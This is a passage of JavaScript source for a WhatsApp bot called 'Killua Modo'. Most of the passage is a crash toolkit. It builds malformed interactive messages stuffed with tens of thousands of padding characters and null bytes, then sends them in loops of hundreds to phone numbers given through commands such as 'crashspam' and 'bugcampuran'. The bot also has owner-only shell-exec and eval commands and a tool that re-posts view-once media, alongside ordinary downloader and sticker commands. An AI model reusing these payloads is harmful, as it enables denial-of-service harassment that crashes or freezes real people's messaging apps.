                                    is_status_mention: "𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }            
        }

async function invc2(target) {
     let nomor = target
     let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await client.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target }
            });
        }
async function UiXGhvY(target) {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: client.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 35675873277,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "𝐌𝐢𝐤𝐚𝐬𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎   ",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎   "
                    },
                },
              },
            body: {
              text: "𝐊𝐢𝐥𝐥𝐮𝐚𝐂𝐫𝐚𝐬𝐡 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 1.𝟎   " + "ꦾ".repeat(10000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u2003".repeat(90000),
                },
                {
                name: "galaxy_message",
buttonParamsJson: `{
"screen_2_OptIn_0": true,
"screen_2_OptIn_1": true,
"screen_1_Dropdown_0": "Null",
"screen_1_DatePicker_1": "1028995200000",
"screen_1_TextInput_2": "tamaryuichix@gmail.com",
"screen_1_TextInput_3": "94643116",
"screen_0_TextInput_0": "radio - buttons${"\0".repeat(100000)}",
"screen_0_TextInput_1": "Anjay",
"screen_0_Dropdown_2": "001-Grimgar",
"screen_0_RadioButtonsGroup_3": "0_true",
"flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
}`,
version: 3
}
              ],
            },
          },
        },
      },
    };
    await client.relayMessage(target, message, {
      participant: { jid: target },
    });
  }
  
async function DelayInvis1(target) {
for (let i = 0; i <= 300; i++) {
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await Zxent1(target)
await Zxent3(target)
await sleep(5000)
 }
 console.log(chalk.blue(`Succes Send Bug Delay Invis V1 To Target ${target}`));
}
async function DelayInvis2(target) {
for (let i = 0; i <= 100; i++) {
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
await Zxent2(target) 
await Zxent1(target)
 }
 console.log(chalk.blue(`Succes Send Bug Delay Invis V1 To Target ${target}`));
}
async function ZxentCrash(target) {
for (let i = 0; i <= 830; i++) {
await ForcloseNew(target)
await CrashFCxUl(target)
await CrashFCxUl(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await CrashFCxUl(target)
await CrashFCxUl(target)
await CrashFCxUl(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await CrashFCxUl(target)
await CrashFCxUl(target)
await CrashFCxUl(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await nativeloc(target)
await CrashFCxUl(target)
await CrashFCxUl(target)
await CrashFCxUl(target)
await CrashFCxUl(target)
await ForcloseNew(target)
await ForcloseNew(target)
await ForcloseNew(target)
await ForcloseNew(target)
await ForcloseNew(target)
await CrashFCxUl(target)
await sleep(7000) 
   }
}  
//FUNCTION COMBO

async function hardcrash(target) {
for (let r = 0; r < 100; r++) {
await CrashFCxUl(target)
await ForcloseNew(target)
await ForcloseNew(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await ForcloseNew(target)
await nativemessage(target)
await nativemessage(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await nativeloc(target)
await nativemessage(target)
await trashinfinity(target)
await CrashJids(target)
await Crashed(target)
await JustinXFlowButton(target)
await CursorimgDoc(target)
await Crashed(target)
await CrashJids(target)
await CursorimgDoc(target)
await trashinfinity(target)
await CrashJids(target)
await Crashed(target)
await JustinXFlowButton(target)
await CursorimgDoc(target)
await Crashed(target)
await CrashJids(target)
await CursorimgDoc(target)
await JustinXFlowButton(target)
await CursorimgDoc(target)
await Crashed(target)
await JustinXFlowButton(target)
await trashinfinity(target)
await CursorimgDoc(target)
await Crashed(target)
}
console.log(chalk.blue(`Sending Crash Hard to ${target}☠️`));
}
 if (!client.public) {
if (!m.key.fromMe) return
}
// ===== !! END FUNCTION !! ===== \\


switch (command) {
case "menu":{
const caption = ` 
 ☆ [𝐂𝐀𝐁𝐑𝐈𝐍𝐎 𝐊𝐈𝐋𝐋𝐔𝐀 𝐌𝐎𝐃𝐎] ☆
ʙᴏᴛ ɴᴀᴍᴇ : 𝐊𝐢𝐥𝐥𝐮𝐚 𝐌𝐨𝐝𝐨
ᴠᴇʀsɪᴏɴ : 1.0.0
ᴅᴇᴠ : 𝐊𝐢𝐥𝐥𝐮𝐚𝐌𝐨𝐝𝐨 𝐗 𝐇𝐢𝐧𝐚𝐭𝐚𝐌𝐨𝐝𝐨

  ☆ [𝐊𝐈𝐋𝐋𝐔𝐀 𝐁𝐔𝐆 𝐌𝐄𝐍𝐔] ☆

> ᴘʀᴏᴛᴏᴄᴏʟʙᴜɢ5 [243xxx]
> ᴢxᴇɴᴛᴄʀᴀsʜ [243xxx]
> ᴍᴀɴᴢxᴇᴠᴇʀʏᴏɴᴇ [243xxx] 
> ᴄʀᴀsʜsᴘᴀᴍ [243xxx]
> ᴅᴇʟᴀʏɪɴᴠɪs [243xxx]
> ғᴄxᴜɪ [243xxx]
> ʙᴜɢᴄᴀᴍᴘᴜʀᴀɴ [243xxx]

  ☆ [𝐌𝐄𝐍𝐔 𝐏𝐑𝐄𝐌𝐈𝐔𝐌] ☆

> 𝚝𝚒𝚔𝚝𝚘𝚔 [link tiktok]
> 𝚢𝚝 [link yt]
> 𝚒𝚐 [link instagram]
> 𝚜𝚝𝚒𝚔𝚎𝚛 [reply image]
> 𝚋𝚛𝚊𝚝 [text]

  ☆ [𝐌𝐄𝐍𝐔 𝐎𝐖𝐍𝐄𝐑] ☆

> 𝙰𝙳𝙳𝙿𝚁𝙴𝙼  [243xxx]
> 𝙰𝙳𝙳𝙾𝚆𝙽𝙴𝚁  [243xxx]
> 𝚛𝚟𝚘
> 𝚙𝚒𝚗
> 𝚜𝚎𝚕𝚏
> 𝚁𝙴𝙰𝙲𝚃𝙲𝙷

> © 𝐊𝐢𝐥𝐥𝐮𝐚𝐌𝐨𝐝𝐨 𝐗 𝐇𝐢𝐧𝐚𝐭𝐚𝐌𝐨𝐝𝐨
`;
  // Kirim dokumen dengan teks menu dalam caption
  await client.sendMessage(
    m.chat,
    {
      document: fs.readFileSync("./package.json"),
      fileName: "Killua Modo Version 1.0",
      fileLength: 99999999999999,
      pageCount: 99999999999999,
      mimetype:
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
      caption: caption, // Caption berisi menu
      contextInfo: {
        mentionedJid: [m.sender],
        externalAdReply: {
          showAdAttribution: true,
          thumbnailUrl: `${thumbUrl}`,
          title: `© Create By Killua Modo`,
          body: null,
          sourceUrl: `${LinkCh}`,
          renderLargerThumbnail: true,
          mediaType: 1,
        },
      },
    },
    { quoted: qchannel } //quoted sesuai sendiri
  );

}
break
case "reactch": {
if (!isOwner) return m.reply(" Khusus Killua 😂 ")
if (!text) return example("linkpesan 😂")
if (!args[0] || !args[1]) return example("linkpesan 😂")
if (!args[0].includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = args[0].split('/')[4]
let serverId = args[0].split('/')[5]
let res = await clieni.newsletterMetadata("invite", result)
await client.newsletterReactMessage(res.id, serverId, args[1])
m.reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)
}
break
case "bratanim": {
         if (!text) return m.reply(`mana text nya? contoh ${prefix + command} apanih cok`)
            const GiftUrl = `https://brat.caliphdev.com/api/brat/animate?text=${text}`;
let encmedia = await client.sendVideoAsSticker(m.chat, GiftUrl, m, {
packname: global.packname,
author: global.author
})
            
    }
break
case 'sticker':
case 'stiker':
case 's':{
if (!isMurbug) return m.reply(' Khusus premium/Murbug ') 
if (!quoted) return m.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await client.sendImageAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await client.sendVideoAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else {
return m.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break

case 'tiktok':
case 'tt': {
if (!isMurbug) return m.repy(' KKhusus premium/Murbug ') 
if (!text) return m.reply(`Contoh : ${prefix + command} linknya`)
let data = await fg.tiktok(text)
let json = data.result
let caption = `[ TIKTOK - DOWNLOAD ]\n\n`
caption += `◦ *Id* : ${json.id}\n`
caption += `◦ *Username* : ${json.author.nickname}\n`
caption += `◦ *Title* : ${(json.title)}\n`
caption += `◦ *Like* : ${(json.digg_count)}\n`
caption += `◦ *Comments* : ${(json.comment_count)}\n`
caption += `◦ *Share* : ${(json.share_count)}\n`
caption += `◦ *Play* : ${(json.play_count)}\n`
caption += `◦ *Created* : ${json.create_time}\n`
caption += `◦ *Size* : ${json.size}\n`
caption += `◦ *Duration* : ${json.duration}`
if (json.images) {
json.images.forEach(async (k) => {
await client.sendMessage(m.chat, { image: { url: k }}, { quoted: qcahbnel });
})
} else {
client.sendMessage(m.chat, { video: { url: json.play }, mimetype: 'video/mp4', caption: caption }, { quoted: qchannel })
setTimeout(() => {
client.sendMessage(m.chat, { audio: { url: json.music }, mimetype: 'audio/mpeg' }, { quoted: qchannel })
}, 3000)
}
}
break                 
case "yt": {
if (!isMurbug) return m.reply(' khusus premium/murbug') 
if (!text) return m.reply('we dont talk')
await client.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
await client.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
}
break
			
case "vv": case "readviewonce": {
if (!isOwner) return m.reply(" khusus owner ") 
if (!m.quoted) return m.reply("dengan reply pesannya")
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return client.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: xy})
    } else if (/image/.test(type)) {
        return client.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: xy})
    } else if (/audio/.test(type)) {
        return client.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: xy})
    } 
}
break
                

            case 'pin': case 'pinterest': {
                if (!q) return m.reply('Mau Nyari Apa Di Pinterest');
                //try {

                async function createImage(url) {
                    const { imageMessage } = await generateWAMessageContent({
                        image: {
                            url
                        }
                    }, {
                        upload: client.waUploadToServer
                    });
                    return imageMessage;
                }

                function shuffleArray(array) {
                    for (let i = array.length - 1; i > 0; i--) {
                        const j = Math.floor(Math.random() * (i + 1));
                        [array[i], array[j]] = [array[j], array[i]];
                    }
                }

                let push = [];
                let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${q}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${q}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
                let res = data.resource_response.data.results.map(v => v.images.orig.url);

                shuffleArray(res); // Mengacak array
                let ult = res.splice(0, 1); // Mengambil gambar pertama dari array yang sudah diacak
                let i = 1;

                for (let pus of ult) {
                    push.push({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: `$${ownerName}`
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.fromObject({
                            text: `*${botName} | New 2023 - 2024*`
                        }),
                        header: proto.Message.InteractiveMessage.Header.fromObject({
                            title: `*Image Hasil Dari :* ${text}`,
                            hasMediaAttachment: true,
                            imageMessage: await createImage(pus)
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                            buttons: [
                                {
                                    name: "cta_url",
                                    buttonParamsJson: `{"display_text":"Pinterest","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
                                }
                            ]
                        })
                    });
                }

                const msg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                body: proto.Message.InteractiveMessage.Body.create({
                                    text: `*🔍 Hasil Pencarian :* ${text}`
                                }),
                                footer: proto.Message.InteractiveMessage.Footer.create({
                                    text: `${botname} | New 2023 - 2025`
                                }),
                                header: proto.Message.InteractiveMessage.Header.create({
                                    hasMediaAttachment: false
                                }),
                                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                    cards: [
                                        ...push
                                    ]
                                })
                            })
                        }
                    }
                }, {});

                await client.relayMessage(m.chat, msg.message, {
                    messageId: msg.key.id
                });

            }
break

case 'instagram': 
case 'ig':
case 'igdl': 
case 'igmp4': {
    if (!text) return m.reply("Masukkan Linknya ?");
    if (!isURL(text)) return m.reply("Masukkan Linknya ?");
    const mediaUrl = await igdl(text);
    const url_media = mediaUrl[0].url;
    try {
        const response = await axios.head(url_media); 
        const contentType = response.headers['content-type']; // Mendapatkan tipe konten dari header
        if (contentType.startsWith('image/')) {
            await client.sendMessage(m.chat, { image: { url: url_media}, caption: mess.success }, { quoted: qchannel });
            return
        } else {
            await client.sendMessage(m.chat, { video: { url: url_media}, caption: mess.success }, { quoted: qchannel });
            return 
        }
    } catch(e) {
        return m.reply(mess.error)
    }
}
break

case 'brat': {
if (!q) return m.reply(`Masukkan teks\n\nContoh: ${prefix + command} manzs HAMIL`);
let rulz = `https://brat.caliphdev.com/api/brat?text=${encodeURIComponent(q)}`;
try {
const res = await axios.get(rulz, { responseType: 'arraybuffer' });
const buffer = Buffer.from(res.data, 'binary');
await client.sendImageAsSticker(m.chat, buffer, m, { packname: ``, author: `${author}` });
} catch (e) {
console.log(e);
await m.reply(`Sedang maintenance atau API error`);
    }
}
    break
case "public": {
if (!isOwner) return m.reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿") 
client.public = true
m.reply(" Succes Public Mode ") 
}
break
case "self": {
if (!isOwner) return m.reply("𝗬𝗼𝘂 𝗡𝗼𝘁 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿") 
client.public = false
m.reply(" Succes Self Mode ") 
}
break  
case "delmurbug":{
if (!isOwner) return m.reply(" Khusus Killua ")
if (!args[0]) return m.reply(`Example Use :\n${prefix+command} 243xxx`)
let ya = q.split("|")[0].replace(/[^0-9]/g, '')
let no = '@s.whatsapp.net'
let unp = murbug.indexOf(ya)
murbug.splice(unp, 1)
fs.writeFileSync("./data/murbug.json", JSON.stringify(murbug))
m.reply(`Sussces Del Murbug ${no}`)
}
break
case "addmurbug":{
if (!isOwner) return m.reply(" Khusus Killua ")
if (!args[0]) return m.reply(`*\`PENGGUNA :\`* *${command} NOMOR*\n*\`EXAMPLE :\`* *${command} 243XXXX*`)
let prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await client.onWhatsApp(prrkek)
if (ceknya.length == 0) return m.reply(`*\`MOHON MASUKAN NOMOR YG TERDAFTAR\`*`)
murbug.push(prrkek)
fs.writeFileSync("./data/murbug.json", JSON.stringify(murbug))
m.reply(`*\`${prrkek} SUKSES MENJADI USER MURBUG!!\`*`)
}
break
case 'zxentcrash':
case 'crashspam': {
    // Tambahkan pengecekan akses
    if (!isMurbug && !isOwner) return m.reply(" Khusus Murbug ")        
    if (!q) 
       m.reply(`Penggunaan ${prefix + command} 243xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return m.reply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 243xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *${pepec}*`;

    // Kirim pesan konfirmasi
    client.sendMessage(m.chat, { 
        image: { url: `https://files.catbox.moe/fwo11s.jpg` },
        caption: `*Sukses Mengirim Bug ke Target ${pepec}*`,
        gifPlayback: true,
    }, { quoted: qchannel });
    // Kirim bug ke target
    for (let i = 0; i < 450; i++) {
     await ForcloseNew(target);
     await ForcloseNew(target);
     await ForcloseNew(target);
     await sleep(8000)
     await ForcloseNew(target);
     await ForcloseNew(target);
     await ForcloseNew(target);
   }
   await ForcloseNew(target);
   await ForcloseNew(target)
}
break
case 'delayinvis':
case 'manzxeveryone': {
    // Tambahkan pengecekan akses
    if (!isMurbug && !isOwner) return m.reply(" Khusus Murbug ")        
    if (!q) 
       m.reply(`Penggunaan ${prefix + command} 243xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return m.reply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 243xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *${pepec}*`;

    // Kirim pesan konfirmasi
    client.sendMessage(m.chat, { 
        image: { url: `https://files.catbox.moe/fwo11s.jpg` },
        caption: `*Sukses Mengirim Bug ke Target ${pepec}*`,
        gifPlayback: true,
    }, { quoted: qchannel });
    // Kirim bug ke target
    for (let i = 0; i < 5; i++) {
     await DelayInvis1(target);
     await sleep(7000) 
     await Delayinvis2(target);
   }
   await DelayInvis2(target);
   await DelayInvis1(target)
}
break
case 'fcxui':
case 'bugcampuran': {
    // Tambahkan pengecekan akses
    if (!isOwner) return m.reply(" Khusus Owner ")        
    if (!q) 
       m.reply(`Penggunaan ${prefix + command} 243xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return m.reply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 243xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗞𝗲 *${pepec}*`;

    // Kirim pesan konfirmasi
    client.sendMessage(m.chat, { 
        image: { url: `https://files.catbox.moe/fwo11s.jpg` },
        caption: `*Sukses Mengirim Bug ke Target ${pepec}*`,
        gifPlayback: true,
    }, { quoted: qchannel });
    // Kirim bug ke target
    for (let i = 0; i < 5; i++) {
     await ZxentCrash(target);
     await sleep(7000) 
     await hardcrash(target);
   }
   await DelayInvis2(target);
   await DelayInvis1(target)
}
case 'protocolbug5': {
    // Tambahkan pengecekan akses
    if (!isMurbug && !isOwner) return m.reply(" Khusus Murbug ")        
    if (!q) 
       m.reply(`Penggunaan ${prefix + command} 243xxx`)    
    // Proses nomor
    let pepec = q.replace(/[^0-9]/g, "")
    if (pepec.startsWith('0')) return m.reply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 243xxx`)  
    let target = pepec + "@s.whatsapp.net";
    let DoneBug = `*𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 *${pepec}*`;

    // Kirim pesan konfirmasi
    client.sendMessage(m.chat, { 
        image: { url: `https://files.catbox.moe/fwo11s.jpg` },
        caption: `*Sukses Mengirim Bug ke Target ${pepec}*`,
        gifPlayback: true,
    }, { quoted: qchannel });
    // Kirim bug ke target
   await protocolbug5(target);
   await protocolbug5(target)
}
break

// ===== !! BATAS BREAK / CASE !! ======== \\
break
default:
if ((m.text).startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return client.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return client.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

if ((m.text).startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return client.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return client.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

if ((m.text).startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
client.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
client.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

}} catch (e) {
console.log(e)
client.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.cyan("File Update => "),
chalk.cyan.bgBlue.bold(`${__filename}`))
delete require.cache[file]
require(file)
})